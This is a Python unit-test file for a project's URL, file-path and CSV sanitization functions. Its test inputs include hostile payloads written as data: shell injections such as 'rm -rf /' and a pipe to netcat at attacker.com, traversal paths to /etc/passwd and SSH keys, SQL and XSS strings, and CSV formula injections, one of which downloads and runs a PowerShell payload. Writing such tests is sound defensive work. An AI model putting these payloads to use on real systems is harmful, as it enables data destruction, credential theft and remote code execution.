#!/usr/bin/env python3
"""
Unit tests for validation module - critical security functions.
"""

# Standardized project imports
from utils.config import setup_project_imports
setup_project_imports()
import unittest
import sys
import os
from pathlib import Path

from utils.validation import (
    validate_url, validate_youtube_url, validate_google_drive_url,
    validate_file_path, ValidationError
)
from utils.sanitization import sanitize_csv_field as sanitize_csv_value

class TestURLValidation(unittest.TestCase):
    """Test URL validation functions"""
    
    def test_validate_url_valid(self):
        """Test valid URLs pass validation"""
        valid_urls = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://drive.google.com/file/d/1234567890",
            "http://example.com",
            "https://docs.google.com/document/d/123/edit"
        ]
        
        for url in valid_urls:
            validated = validate_url(url)
            self.assertIsInstance(validated, str)
    
    def test_validate_url_invalid(self):
        """Test invalid URLs are rejected"""
        invalid_urls = [
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "ftp://example.com",
            "data:text/html,<script>alert('xss')</script>",
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            None,
            "",
            "not a url at all"
        ]
        
        for url in invalid_urls:
            with self.assertRaises(ValidationError):
                validate_url(url)
    
    def test_validate_url_command_injection(self):
        """Test command injection attempts are blocked"""
        malicious_urls = [
            "https://example.com/$(rm -rf /)",
            "https://example.com/`whoami`",
            "https://example.com/;ls -la",
            "https://example.com/' && cat /etc/passwd && '",
            "https://example.com/|nc attacker.com 1234"
        ]
        
        for url in malicious_urls:
            try:
                validate_url(url)
                self.fail(f"ValidationError not raised for malicious URL: {url}")
            except ValidationError:
                pass  # Expected
    
    def test_validate_youtube_url(self):
        """Test YouTube URL validation"""
        valid_youtube_urls = [
            ("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "dQw4w9WgXcQ"),
            ("https://youtu.be/dQw4w9WgXcQ", "dQw4w9WgXcQ"),
            ("https://youtube.com/watch?v=dQw4w9WgXcQ", "dQw4w9WgXcQ")
        ]
        
        for url, expected_id in valid_youtube_urls:
            result = validate_youtube_url(url)
            self.assertIsInstance(result, tuple)
            self.assertEqual(len(result), 2)
            validated_url, video_id = result
            self.assertIsInstance(validated_url, str)
            self.assertEqual(video_id, expected_id)
    
    def test_validate_youtube_url_invalid(self):
        """Test non-YouTube URLs are rejected"""
        # These should fail domain validation
        with self.assertRaises(ValidationError):
            validate_youtube_url("https://example.com/watch?v=dQw4w9WgXcQ")
        
        with self.assertRaises(ValidationError):
            validate_youtube_url("https://drive.google.com/file/d/123")
        
        # This should fail video ID extraction
        with self.assertRaises(ValidationError):
            validate_youtube_url("https://youtube.com/notavalidpath")
    
    def test_validate_google_drive_url(self):
        """Test Google Drive URL validation"""
        valid_drive_urls = [
            ("https://drive.google.com/file/d/1234567890/view", "1234567890"),
            ("https://docs.google.com/document/d/123/edit", "123"),
            ("https://drive.google.com/open?id=1234567890", "1234567890")
        ]
        
        for url, expected_id in valid_drive_urls:
            result = validate_google_drive_url(url)
            self.assertIsInstance(result, tuple)
            self.assertEqual(len(result), 2)
            validated_url, file_id = result
            self.assertIsInstance(validated_url, str)
            self.assertEqual(file_id, expected_id)
    
    def test_validate_google_drive_url_invalid(self):
        """Test non-Google Drive URLs are rejected"""
        # These should fail domain validation
        with self.assertRaises(ValidationError):
            validate_google_drive_url("https://example.com/file/d/123")
        
        with self.assertRaises(ValidationError):
            validate_google_drive_url("https://youtube.com/watch?v=123")
        
        # This should fail file ID extraction
        with self.assertRaises(ValidationError):
            validate_google_drive_url("https://drive.google.com/notavalidpath")

class TestFilePathValidation(unittest.TestCase):
    """Test file path validation functions"""
    
    def test_validate_file_path_null_bytes(self):
        """Test null bytes in paths are rejected"""
        with self.assertRaises(ValidationError):
            validate_file_path("file\x00.txt")
    
    def test_validate_file_path_valid(self):
        """Test valid file paths pass validation"""
        valid_paths = [
            "output.csv",
            "downloads/video.mp4",
            "data/file.txt",
            "./relative/path.txt"
        ]
        
        for path in valid_paths:
            validated = validate_file_path(path)
            # validate_file_path returns a Path object
            from pathlib import Path
            self.assertIsInstance(validated, Path)
    
    def test_validate_file_path_traversal(self):
        """Test path traversal attempts are blocked when base_dir is set"""
        import tempfile
        with tempfile.TemporaryDirectory() as base_dir:
            # These paths try to escape the base directory
            malicious_paths = [
                "../../../etc/passwd",
                "downloads/../../../etc/passwd",
                "../../.ssh/id_rsa"
            ]
            
            for path in malicious_paths:
                with self.assertRaises(ValidationError):
                    validate_file_path(path, base_dir=base_dir)
    
    def test_validate_file_path_special_chars(self):
        """Test paths with special characters are handled safely"""
        # These paths contain special chars but are valid filenames
        special_paths = [
            "file$(whoami).txt",
            "file`id`.txt",
            "file;ls;.txt",
            "file|test.txt"
        ]
        
        for path in special_paths:
            # Should not raise - these are valid filenames
            validated = validate_file_path(path)
            self.assertIsInstance(validated, Path)
            # The path should be properly escaped/safe
            self.assertIn(path.replace('/', ''), str(validated))

class TestCSVSanitization(unittest.TestCase):
    """Test CSV value sanitization"""
    
    def test_sanitize_csv_value_safe(self):
        """Test safe values are preserved"""
        safe_values = [
            "Normal text",
            "Text with spaces",
            "123456",
            "user@example.com",
            "https://example.com"
        ]
        
        for value in safe_values:
            sanitized = sanitize_csv_value(value)
            self.assertEqual(sanitized, value)
    
    def test_sanitize_csv_value_formula_injection(self):
        """Test CSV formula injection is prevented"""
        malicious_values = [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(A1:A10)",
            "=cmd|'/c calc'!A1",
            "=2+5+cmd|'/c calc'!A1",
            "=cmd|'/c powershell IEX(wget 0r.pe/p)'!A1"
        ]
        
        for value in malicious_values:
            sanitized = sanitize_csv_value(value)
            # Should be quoted or prefixed to prevent formula execution
            self.assertNotEqual(sanitized[0], value[0])
            # First character should be a quote to prevent formula execution
            self.assertEqual(sanitized[0], "'")
    
    def test_sanitize_csv_value_none(self):
        """Test None values are handled"""
        self.assertEqual(sanitize_csv_value(None), "")
    
    def test_sanitize_csv_value_numbers(self):
        """Test numeric values are converted to strings"""
        self.assertEqual(sanitize_csv_value(123), "123")
        self.assertEqual(sanitize_csv_value(45.67), "45.67")
        self.assertEqual(sanitize_csv_value(True), "True")

if __name__ == "__main__":
    unittest.main()